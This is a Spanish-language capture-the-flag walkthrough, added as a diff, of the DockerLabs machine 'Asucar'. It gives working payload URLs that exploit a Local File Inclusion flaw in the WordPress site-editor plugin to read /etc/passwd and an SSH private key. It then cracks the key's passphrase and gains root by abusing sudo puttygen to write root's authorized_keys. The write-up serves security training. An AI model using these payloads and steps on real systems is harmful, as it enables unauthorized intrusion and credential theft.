@@ -1,0 +1,219 @@
+---
+title: Asucar
+description: Resolución completa de la máquina virtual *Asucar* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Asucar**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con WordPress y el plugin `site-editor` vulnerable a **Local File Inclusion (LFI)**. Esta vulnerabilidad permite leer el archivo `/home/curiosito/.ssh/id_rsa`, obteniendo una clave privada SSH protegida por passphrase. Tras crackear la passphrase con John the Ripper, se accede al sistema como el usuario `curiosito`.
+Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `puttygen` como root. Aprovechando esta herramienta, se genera un par de claves SSH y se añade la clave pública al archivo `authorized_keys` de root, obteniendo acceso completo como `root` vía SSH.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Asucar',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Media',
+    Fecha: '12/05/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Asucar.zip
+sudo bash auto_deploy.sh Asucar.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Asucar/{content,exploits,nmap,scripts}
+cd Asucar
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1768979368/Ports_xqaqqw.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
+  -x php,html,txt,js,json -t 100 -C 404
+```
+
+Se detecta el dominio `asucar.dl` y se agrega al `/etc/hosts`:
+
+```bash
+echo "172.17.0.2 asucar.dl" | sudo tee -a /etc/hosts
+```
+
+Se utiliza `wpscan` para enumerar usuarios y plugins:
+
+```bash
+wpscan --url http://asucar.dl --detection-mode aggressive -e ap,at,u -t 32
+```
+
+![User WordPress](https://res.cloudinary.com/dewqswzke/image/upload/v1768979369/UserWordpress_ltt2e1.png)
+
+Se identifica el plugin `site-editor` (versión 1.1.1):
+
+![Plugins WordPress](https://res.cloudinary.com/dewqswzke/image/upload/v1768979369/PluginsWordpress_zxqvpr.png)
+
+Al verificar con `searchsploit`, se confirma que es vulnerable a **LFI**:
+
+![Searchsploit](https://res.cloudinary.com/dewqswzke/image/upload/v1768979369/Searchsploit_uzmgdz.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 LFI en plugin site-editor
+
+Se explota la vulnerabilidad para leer archivos del sistema:
+
+```
+http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+```
+
+![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1768979369/Passwd_myp2ab.png)
+
+Se identifica el usuario `curiosito`. Se lee la clave privada SSH:
+
+```
+http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/curiosito/.ssh/id_rsa
+```
+
+### 2.2 Crackeo de passphrase
+
+La clave está protegida por passphrase. Se usa `ssh2john` y `john` para crackearla:
+
+```bash
+ssh2john rsa > rsa.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
+```
+
+![John](https://res.cloudinary.com/dewqswzke/image/upload/v1768979368/John_et9zbb.png)
+
+### 2.3 Acceso SSH
+
+Se conecta al sistema:
+
+```bash
+ssh -i rsa curiosito@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1768979369/SSh_akyy3p.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De curiosito → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1768979369/Sudo-l_hq1ptm.png)
+
+Se puede ejecutar `puttygen` como root. Se genera un par de claves:
+
+```bash
+puttygen -t rsa -o id_rsa -O private-openssh
+```
+
+Se añade la clave pública a `authorized_keys` de root:
+
+```bash
+sudo puttygen id_rsa -o /root/.ssh/authorized_keys -O public-openssh
+```
+
+Se asignan permisos y se conecta como root:
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa root@127.0.0.1
+```
+
+![SSH Root](https://res.cloudinary.com/dewqswzke/image/upload/v1768979369/SSHRoot_gtzqfa.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Plugin site-editor vulnerable a LFI",
+      severity: "Crítica",
+      impact: "Lectura de archivos sensibles del sistema"
+    },
+    {
+      vulnerability: "Exposición de clave privada SSH vía LFI",
+      severity: "Crítica",
+      impact: "Acceso SSH al sistema mediante crackeo de passphrase"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en puttygen",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
